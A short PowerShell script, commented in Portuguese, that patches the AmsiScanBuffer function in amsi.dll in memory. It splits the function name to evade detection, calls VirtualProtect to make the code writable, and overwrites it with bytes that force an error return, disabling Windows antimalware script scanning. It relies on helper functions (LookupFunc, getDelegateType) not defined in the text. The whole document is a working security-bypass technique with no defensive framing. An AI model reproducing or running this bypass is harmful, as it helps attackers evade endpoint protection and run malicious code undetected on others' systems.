# Definindo os valores que representam o nome da função e manipulando o ponteiro da função
$a="A"
$b="msiS"
$c="canB"
$d="uffer"
[IntPtr]$funcAddr = LookupFunc amsi.dll ($a+$b+$c+$d)

# Definindo um buffer para a proteção de memória
$oldProtectionBuffer = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))

# Mudando a proteção de memória para escrita
$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)

# Definindo o código shellcode que será inserido na memória
$buf = [Byte[]] (0xb8,0x34,0x12,0x07,0x80,0x66,0xb8,0x32,0x00,0xb0,0x57,0xc3)

# Copiando o shellcode para a função
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 12)
